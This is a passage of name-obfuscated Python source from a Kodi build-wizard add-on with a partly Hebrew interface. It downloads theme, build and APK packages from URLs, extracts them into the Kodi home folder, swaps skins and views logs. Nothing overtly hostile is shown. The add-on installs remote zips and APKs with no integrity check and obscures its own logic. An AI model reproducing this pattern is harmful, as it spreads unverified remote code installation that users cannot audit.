			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4562
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4563
			OOO0OO0O0OO000000 =os .path .join (PACKAGES ,'%s.zip'%OOO0O0OOOO0OO000O )#line:4564
			try :os .remove (OOO0OO0O0OO000000 )#line:4565
			except :pass #line:4566
			downloader .download (O0O0O00O0O00OO0O0 ,OOO0OO0O0OO000000 ,DP )#line:4567
			xbmc .sleep (1000 )#line:4568
			DP .update (0 ,"","Installing %s "%OOOO0OOO0OO0OO000 )#line:4569
			O0O00OO0000OO0O00 =False #line:4570
			if url not in ["fresh","normal"]:#line:4571
				O0O00OO0000OO0O00 =testTheme (OOO0OO0O0OO000000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4572
				O0000OOO0O0O0O000 =testGui (OOO0OO0O0OO000000 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4573
				if O0O00OO0000OO0O00 ==True :#line:4574
					wiz .lookandFeelData ('save')#line:4575
					O00O0OOO00000000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4576
					OO0O00O000OOOOO00 =xbmc .getSkinDir ()#line:4577
					skinSwitch .swapSkins (O00O0OOO00000000O )#line:4579
					O0O000OO0O0O00OOO =0 #line:4580
					xbmc .sleep (1000 )#line:4581
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000OO0O0O00OOO <150 :#line:4582
						O0O000OO0O0O00OOO +=1 #line:4583
						xbmc .sleep (1000 )#line:4584
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4585
						wiz .ebi ('SendClick(11)')#line:4586
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4587
					xbmc .sleep (1000 )#line:4588
			O0O000O00OO0O0000 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4589
			DP .update (0 ,O0O000O00OO0O0000 ,'','אנא המתן')#line:4590
			O0OO0OO0OO000OOOO ,OO0OOOOO00O0OO000 ,OO0O00O00OO000OO0 =extract .all (OOO0OO0O0OO000000 ,HOME ,DP ,title =O0O000O00OO0O0000 )#line:4591
			wiz .setS ('buildtheme',theme )#line:4592
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO0OO0OO000OOOO ,OO0OOOOO00O0OO000 ))#line:4593
			DP .close ()#line:4594
			if url not in ["fresh","normal"]:#line:4595
				wiz .forceUpdate ()#line:4596
				if KODIV >=17 :wiz .kodi17Fix ()#line:4597
				if O0000OOO0O0O0O000 ==True :#line:4598
					wiz .lookandFeelData ('save')#line:4599
					wiz .defaultSkin ()#line:4600
					OO0O00O000OOOOO00 =wiz .getS ('defaultskin')#line:4601
					skinSwitch .swapSkins (OO0O00O000OOOOO00 )#line:4602
					O0O000OO0O0O00OOO =0 #line:4603
					xbmc .sleep (1000 )#line:4604
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000OO0O0O00OOO <150 :#line:4605
						O0O000OO0O0O00OOO +=1 #line:4606
						xbmc .sleep (1000 )#line:4607
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4609
						wiz .ebi ('SendClick(11)')#line:4610
					wiz .lookandFeelData ('restore')#line:4611
				elif O0O00OO0000OO0O00 ==True :#line:4612
					skinSwitch .swapSkins (OO0O00O000OOOOO00 )#line:4613
					O0O000OO0O0O00OOO =0 #line:4614
					xbmc .sleep (1000 )#line:4615
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000OO0O0O00OOO <150 :#line:4616
						O0O000OO0O0O00OOO +=1 #line:4617
						xbmc .sleep (1000 )#line:4618
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4620
						wiz .ebi ('SendClick(11)')#line:4621
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4622
					wiz .lookandFeelData ('restore')#line:4623
				else :#line:4624
					wiz .ebi ("ReloadSkin()")#line:4625
					xbmc .sleep (1000 )#line:4626
					wiz .ebi ("Container.Refresh")#line:4627
		else :#line:4628
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4629
def skin_homeselect ():#line:4633
	try :#line:4635
		OOO0O00O0OOO0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4636
		O0OO00OOO0O0OOOOO =open (OOO0O00O0OOO0OOO0 ,'r')#line:4638
		OOOOOO00O0000O0OO =O0OO00OOO0O0OOOOO .read ()#line:4639
		O0OO00OOO0O0OOOOO .close ()#line:4640
		OO000OO0000O0OO0O ='<setting id="FirstRunSetup" type="bool(.+?)/setting>'#line:4641
		OO0OOO00OOOO0O0O0 =re .compile (OO000OO0000O0OO0O ).findall (OOOOOO00O0000O0OO )[0 ]#line:4642
		O0OO00OOO0O0OOOOO =open (OOO0O00O0OOO0OOO0 ,'w')#line:4643
		O0OO00OOO0O0OOOOO .write (OOOOOO00O0000O0OO .replace ('<setting id="FirstRunSetup" type="bool%s/setting>'%OO0OOO00OOOO0O0O0 ,'<setting id="FirstRunSetup" type="bool"></setting>'))#line:4644
		O0OO00OOO0O0OOOOO .close ()#line:4645
	except :#line:4646
		pass #line:4647
def skin_lower ():#line:4650
	OOO0OOOOOOOOO0000 =(ADDON .getSetting ("lower"))#line:4651
	if OOO0OOOOOOOOO0000 =='true':#line:4652
		try :#line:4655
			O0OOOO0000O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4656
			O0OOOOO0O000OOOOO =open (O0OOOO0000O0OOO0O ,'r')#line:4658
			O00OOO0O00O0000O0 =O0OOOOO0O000OOOOO .read ()#line:4659
			O0OOOOO0O000OOOOO .close ()#line:4660
			OOOOO0O00O0000OOO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4661
			O00O000O000O0000O =re .compile (OOOOO0O00O0000OOO ).findall (O00OOO0O00O0000O0 )[0 ]#line:4662
			O0OOOOO0O000OOOOO =open (O0OOOO0000O0OOO0O ,'w')#line:4663
			O0OOOOO0O000OOOOO .write (O00OOO0O00O0000O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O00O000O000O0000O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4664
			O0OOOOO0O000OOOOO .close ()#line:4665
		except :#line:4731
			pass #line:4732
def thirdPartyInstall (O00OOO0000OO000O0 ,O0000OO00O00000OO ):#line:4734
	if not wiz .workingURL (O0000OO00O00000OO ):#line:4735
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4736
	O00O0O0OO000OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO0000OO000O0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4737
	if O00O0O0OO000OOO00 ==1 :#line:4738
		freshStart ('third',True )#line:4739
	wiz .clearS ('build')#line:4740
	O0O00O000O0OOO000 =O00OOO0000OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4741
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4742
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0000OO000O0 ),'','אנא המתן')#line:4743
	O00O0OO0OOOO000OO =os .path .join (PACKAGES ,'%s.zip'%O0O00O000O0OOO000 )#line:4744
	try :os .remove (O00O0OO0OOOO000OO )#line:4745
	except :pass #line:4746
	downloader .download (O0000OO00O00000OO ,O00O0OO0OOOO000OO ,DP )#line:4747
	xbmc .sleep (1000 )#line:4748
	OO0OO0OO000O0OO00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0000OO000O0 )#line:4749
	DP .update (0 ,OO0OO0OO000O0OO00 ,'','אנא המתן')#line:4750
	OOOOOO0OOO000OOOO ,OOO000O0O00OOOOO0 ,O0OO00OO000OO00OO =extract .all (O00O0OO0OOOO000OO ,HOME ,DP ,title =OO0OO0OO000O0OO00 )#line:4751
	if int (float (OOOOOO0OOO000OOOO ))>0 :#line:4752
		wiz .fixmetas ()#line:4753
		wiz .lookandFeelData ('save')#line:4754
		wiz .defaultSkin ()#line:4755
		wiz .setS ('installed','true')#line:4757
		wiz .setS ('extract',str (OOOOOO0OOO000OOOO ))#line:4758
		wiz .setS ('errors',str (OOO000O0O00OOOOO0 ))#line:4759
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOOO0OOO000OOOO ,OOO000O0O00OOOOO0 ))#line:4760
		try :os .remove (O00O0OO0OOOO000OO )#line:4761
		except :pass #line:4762
		if int (float (OOO000O0O00OOOOO0 ))>0 :#line:4763
			O0000O0O00O00OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO0000OO000O0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOOOO0OOO000OOOO ,'%',COLOR1 ,OOO000O0O00OOOOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4764
			if O0000O0O00O00OOOO :#line:4765
				if isinstance (OOO000O0O00OOOOO0 ,unicode ):#line:4766
					O0OO00OO000OO00OO =O0OO00OO000OO00OO .encode ('utf-8')#line:4767
				wiz .TextBox (ADDONTITLE ,O0OO00OO000OO00OO )#line:4768
	DP .close ()#line:4769
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4770
	if INSTALLMETHOD ==1 :O0OOO00OOO0O00O00 =1 #line:4771
	elif INSTALLMETHOD ==2 :O0OOO00OOO0O00O00 =0 #line:4772
	else :O0OOO00OOO0O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4773
	if O0OOO00OOO0O00O00 ==1 :wiz .reloadFix ()#line:4774
	else :wiz .killxbmc (True )#line:4775
def testTheme (O000OO0O00OOOO0OO ):#line:4777
	O0OO0O0OO000OOOOO =zipfile .ZipFile (O000OO0O00OOOO0OO )#line:4778
	for O000O00OO000OOOOO in O0OO0O0OO000OOOOO .infolist ():#line:4779
		if '/settings.xml'in O000O00OO000OOOOO .filename :#line:4780
			return True #line:4781
	return False #line:4782
def testGui (OO00O000O000OOOO0 ):#line:4784
	O0O0O0OO0O0OOOOOO =zipfile .ZipFile (OO00O000O000OOOO0 )#line:4785
	for OOOOO0O0000000000 in O0O0O0OO0O0OOOOOO .infolist ():#line:4786
		if '/guisettings.xml'in OOOOO0O0000000000 .filename :#line:4787
			return True #line:4788
	return False #line:4789
def apkInstaller (O000000000000O0O0 ,O000O0O00O00OOO0O ):#line:4791
	wiz .log (O000000000000O0O0 )#line:4792
	wiz .log (O000O0O00O00OOO0O )#line:4793
	if wiz .platform ()=='android':#line:4794
		OOOOOO00O0O00OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000000000O0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4795
		if not OOOOOO00O0O00OO00 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4796
		O0O0OO0OOOO0000O0 =O000000000000O0O0 #line:4797
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4798
		if not wiz .workingURL (O000O0O00O00OOO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4799
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO0OOOO0000O0 ),'','אנא המתן')#line:4800
		OO0OO00O00O0O00O0 =os .path .join (PACKAGES ,"%s.apk"%O000000000000O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4801
		try :os .remove (OO0OO00O00O0O00O0 )#line:4802
		except :pass #line:4803
		downloader .download (O000O0O00O00OOO0O ,OO0OO00O00O0O00O0 ,DP )#line:4804
		xbmc .sleep (100 )#line:4805
		DP .close ()#line:4806
		notify .apkInstaller (O000000000000O0O0 )#line:4807
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0OO00O00O0O00O0 +'")')#line:4808
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4809
def createMenu (OO00O0O0OO0O00OO0 ,O00O0OO0OOO0O00O0 ,OOOO000O00O0OOOO0 ):#line:4815
	if OO00O0O0OO0O00OO0 =='saveaddon':#line:4816
		OOOOO0OOOOOO00OO0 =[]#line:4817
		O000O0OO0O00OOOOO =urllib .quote_plus (O00O0OO0OOO0O00O0 .lower ().replace (' ',''))#line:4818
		OO000000OO00O00OO =O00O0OO0OOO0O00O0 .replace ('Debrid','Real Debrid')#line:4819
		O000OO0O000O00OO0 =urllib .quote_plus (OOOO000O00O0OOOO0 .lower ().replace (' ',''))#line:4820
		OOOO000O00O0OOOO0 =OOOO000O00O0OOOO0 .replace ('url','URL Resolver')#line:4821
		OOOOO0OOOOOO00OO0 .append ((THEME2 %OOOO000O00O0OOOO0 .title (),' '))#line:4822
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Save %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4823
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Restore %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4824
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Clear %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4825
	elif OO00O0O0OO0O00OO0 =='save':#line:4826
		OOOOO0OOOOOO00OO0 =[]#line:4827
		O000O0OO0O00OOOOO =urllib .quote_plus (O00O0OO0OOO0O00O0 .lower ().replace (' ',''))#line:4828
		OO000000OO00O00OO =O00O0OO0OOO0O00O0 .replace ('Debrid','Real Debrid')#line:4829
		O000OO0O000O00OO0 =urllib .quote_plus (OOOO000O00O0OOOO0 .lower ().replace (' ',''))#line:4830
		OOOO000O00O0OOOO0 =OOOO000O00O0OOOO0 .replace ('url','URL Resolver')#line:4831
		OOOOO0OOOOOO00OO0 .append ((THEME2 %OOOO000O00O0OOOO0 .title (),' '))#line:4832
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Register %s'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4833
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Save %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4834
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Restore %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4835
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Import %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4836
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Clear Addon %s Data'%OO000000OO00O00OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O000O0OO0O00OOOOO ,O000OO0O000O00OO0 )))#line:4837
	elif OO00O0O0OO0O00OO0 =='install':#line:4838
		OOOOO0OOOOOO00OO0 =[]#line:4839
		O000OO0O000O00OO0 =urllib .quote_plus (OOOO000O00O0OOOO0 )#line:4840
		OOOOO0OOOOOO00OO0 .append ((THEME2 %OOOO000O00O0OOOO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O000OO0O000O00OO0 )))#line:4841
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O000OO0O000O00OO0 )))#line:4842
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O000OO0O000O00OO0 )))#line:4843
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O000OO0O000O00OO0 )))#line:4844
		OOOOO0OOOOOO00OO0 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O000OO0O000O00OO0 )))#line:4845
	OOOOO0OOOOOO00OO0 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4846
	return OOOOO0OOOOOO00OO0 #line:4847
def toggleCache (OOO0O00O00O00O000 ):#line:4849
	OOOO0OOOO000OO0O0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4850
	OOO00O00O00OO0000 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4851
	if OOO0O00O00O00O000 in ['true','false']:#line:4852
		for OO00O00O0OOO0O0OO in OOOO0OOOO000OO0O0 :#line:4853
			wiz .setS (OO00O00O0OOO0O0OO ,OOO0O00O00O00O000 )#line:4854
	else :#line:4855
		if not OOO0O00O00O00O000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4856
			try :#line:4857
				OO00O00O0OOO0O0OO =OOO00O00O00OO0000 [OOOO0OOOO000OO0O0 .index (OOO0O00O00O00O000 )]#line:4858
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO00O00O0OOO0O0OO ))#line:4859
			except :#line:4860
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0O00O00O00O000 ))#line:4861
		else :#line:4862
			OOO00OOOOOO00O0OO ='true'if wiz .getS (OOO0O00O00O00O000 )=='false'else 'false'#line:4863
			wiz .setS (OOO0O00O00O00O000 ,OOO00OOOOOO00O0OO )#line:4864
def playVideo (O000OO0000000OO0O ):#line:4866
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O000OO0000000OO0O )#line:4867
	if 'watch?v='in O000OO0000000OO0O :#line:4868
		OO00000000OO00000 ,O00OOO000O00000OO =O000OO0000000OO0O .split ('?')#line:4869
		O0000O0O00OO0O0O0 =O00OOO000O00000OO .split ('&')#line:4870
		for O0000O00OO0O0O000 in O0000O0O00OO0O0O0 :#line:4871
			if O0000O00OO0O0O000 .startswith ('v='):#line:4872
				O000OO0000000OO0O =O0000O00OO0O0O000 [2 :]#line:4873
				break #line:4874
			else :continue #line:4875
	elif 'embed'in O000OO0000000OO0O or 'youtu.be'in O000OO0000000OO0O :#line:4876
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O000OO0000000OO0O )#line:4877
		OO00000000OO00000 =O000OO0000000OO0O .split ('/')#line:4878
		if len (OO00000000OO00000 [-1 ])>5 :#line:4879
			O000OO0000000OO0O =OO00000000OO00000 [-1 ]#line:4880
		elif len (OO00000000OO00000 [-2 ])>5 :#line:4881
			O000OO0000000OO0O =OO00000000OO00000 [-2 ]#line:4882
	wiz .log ("YouTube URL: %s"%O000OO0000000OO0O )#line:4883
	yt .PlayVideo (O000OO0000000OO0O )#line:4884
def viewLogFile ():#line:4886
	OO0O000O0OOOOOOOO =wiz .Grab_Log (True )#line:4887
	O00O0O0O0O00OOO0O =wiz .Grab_Log (True ,True )#line:4888
	OOO00O00OOO0O000O =0 ;O0OOO0O000OO00000 =OO0O000O0OOOOOOOO #line:4889
	if not O00O0O0O0O00OOO0O ==False and not OO0O000O0OOOOOOOO ==False :#line:4890
		OOO00O00OOO0O000O =DIALOG .select (ADDONTITLE ,["View %s"%OO0O000O0OOOOOOOO .replace (LOG ,""),"View %s"%O00O0O0O0O00OOO0O .replace (LOG ,"")])#line:4891
		if OOO00O00OOO0O000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4892
	elif OO0O000O0OOOOOOOO ==False and O00O0O0O0O00OOO0O ==False :#line:4893
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4894
		return #line:4895
	elif not OO0O000O0OOOOOOOO ==False :OOO00O00OOO0O000O =0 #line:4896
	elif not O00O0O0O0O00OOO0O ==False :OOO00O00OOO0O000O =1 #line:4897
	O0OOO0O000OO00000 =OO0O000O0OOOOOOOO if OOO00O00OOO0O000O ==0 else O00O0O0O0O00OOO0O #line:4899
	O0O0OOO00O000OOO0 =wiz .Grab_Log (False )if OOO00O00OOO0O000O ==0 else wiz .Grab_Log (False ,True )#line:4900
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0OOO0O000OO00000 ),O0O0OOO00O000OOO0 )#line:4902
def errorChecking (log =None ,count =None ,all =None ):#line:4904
	if log ==None :#line:4905
		OO00OOOOO00OOOO00 =wiz .Grab_Log (True )#line:4906
		O0O0OOOO00OOO00OO =wiz .Grab_Log (True ,True )#line:4907
		if not O0O0OOOO00OOO00OO ==False and not OO00OOOOO00OOOO00 ==False :#line:4908
			OO00O0000OO0O000O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO00OOOOO00OOOO00 .replace (LOG ,""),errorChecking (OO00OOOOO00OOOO00 ,True ,True )),"View %s: %s error(s)"%(O0O0OOOO00OOO00OO .replace (LOG ,""),errorChecking (O0O0OOOO00OOO00OO ,True ,True ))])#line:4909
			if OO00O0000OO0O000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4910
		elif OO00OOOOO00OOOO00 ==False and O0O0OOOO00OOO00OO ==False :#line:4911
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4912
			return #line:4913
		elif not OO00OOOOO00OOOO00 ==False :OO00O0000OO0O000O =0 #line:4914
		elif not O0O0OOOO00OOO00OO ==False :OO00O0000OO0O000O =1 #line:4915
		log =OO00OOOOO00OOOO00 if OO00O0000OO0O000O ==0 else O0O0OOOO00OOO00OO #line:4916
	if log ==False :#line:4917
		if count ==None :#line:4918
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4919
			return False #line:4920
		else :#line:4921
			return 0 #line:4922
	else :#line:4923
		if os .path .exists (log ):#line:4924
			O000O000000OO0OO0 =open (log ,mode ='r');OOO00O0OO00O00OOO =O000O000000OO0OO0 .read ().replace ('\n','').replace ('\r','');O000O000000OO0OO0 .close ()#line:4925
			O0O000OO00OOO0O00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO00O0OO00O00OOO )#line:4926
			if not count ==None :#line:4927
				if all ==None :#line:4928
					O0000OO0O00O00O0O =0 #line:4929
					for O00OO000OOO0O00OO in O0O000OO00OOO0O00 :#line:4930
						if ADDON_ID in O00OO000OOO0O00OO :O0000OO0O00O00O0O +=1 #line:4931
					return O0000OO0O00O00O0O #line:4932
				else :return len (O0O000OO00OOO0O00 )#line:4933
			if len (O0O000OO00OOO0O00 )>0 :#line:4934
				O0000OO0O00O00O0O =0 ;OO0OOO000OOOOO0OO =""#line:4935
				for O00OO000OOO0O00OO in O0O000OO00OOO0O00 :#line:4936
					if all ==None and not ADDON_ID in O00OO000OOO0O00OO :continue #line:4937
					else :#line:4938
						O0000OO0O00O00O0O +=1 #line:4939
						OO0OOO000OOOOO0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000OO0O00O00O0O ,O00OO000OOO0O00OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4940
				if O0000OO0O00O00O0O >0 :#line:4941
					wiz .TextBox (ADDONTITLE ,OO0OOO000OOOOO0OO )#line:4942
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4943
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4944
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4945
ACTION_PREVIOUS_MENU =10 #line:4947
ACTION_NAV_BACK =92 #line:4948
ACTION_MOVE_LEFT =1 #line:4949
ACTION_MOVE_RIGHT =2 #line:4950
ACTION_MOVE_UP =3 #line:4951
ACTION_MOVE_DOWN =4 #line:4952
ACTION_MOUSE_WHEEL_UP =104 #line:4953
ACTION_MOUSE_WHEEL_DOWN =105 #line:4954
ACTION_MOVE_MOUSE =107 #line:4955
ACTION_SELECT_ITEM =7 #line:4956
ACTION_BACKSPACE =110 #line:4957
ACTION_MOUSE_LEFT_CLICK =100 #line:4958
ACTION_MOUSE_LONG_CLICK =108 #line:4959
def LogViewer (default =None ):#line:4961
	class O0O00000O0OOO0OOO (xbmcgui .WindowXMLDialog ):#line:4962
		def __init__ (O0O0OO000000O0000 ,*O000O000O0O00O0OO ,**O000O0000OOO0O0O0 ):#line:4963
			O0O0OO000000O0000 .default =O000O0000OOO0O0O0 ['default']#line:4964
		def onInit (O000OOOO0OOO000OO ):#line:4966
			O000OOOO0OOO000OO .title =101 #line:4967
			O000OOOO0OOO000OO .msg =102 #line:4968
			O000OOOO0OOO000OO .scrollbar =103 #line:4969
			O000OOOO0OOO000OO .upload =201 #line:4970
			O000OOOO0OOO000OO .kodi =202 #line:4971
			O000OOOO0OOO000OO .kodiold =203 #line:4972
			O000OOOO0OOO000OO .wizard =204 #line:4973
			O000OOOO0OOO000OO .okbutton =205 #line:4974
			OO00OO0O0OO000O0O =open (O000OOOO0OOO000OO .default ,'r')#line:4975
			O000OOOO0OOO000OO .logmsg =OO00OO0O0OO000O0O .read ()#line:4976
			OO00OO0O0OO000O0O .close ()#line:4977
			O000OOOO0OOO000OO .titlemsg ="%s: %s"%(ADDONTITLE ,O000OOOO0OOO000OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4978
			O000OOOO0OOO000OO .showdialog ()#line:4979
		def showdialog (OOOO0O0000O0OO000 ):#line:4981
